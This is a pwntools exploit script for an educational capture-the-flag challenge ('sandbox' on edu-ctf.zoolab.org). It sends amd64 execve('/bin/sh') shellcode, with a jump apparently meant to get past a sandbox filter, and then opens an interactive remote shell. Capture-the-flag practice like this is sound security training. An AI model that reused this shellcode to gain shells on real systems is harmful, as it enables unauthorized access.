from pwn import *


# r = process("./sandbox")
r = remote("edu-ctf.zoolab.org",30202)

context.arch = 'amd64'
context.terminal = ['tmux', 'splitw', '-h']


sc = asm("""
xor rsi,rsi
xor rdx,rdx
xor rax, rax
mov al, 0x3b
movabs rdi, 0x68732f6e69622f
push rdi
mov rdi, rsp
jmp $+10
""")

print(len(sc),sc)
# gdb.attach(r)
r.sendline(sc)
# gdb.attach(r)

r.interactive()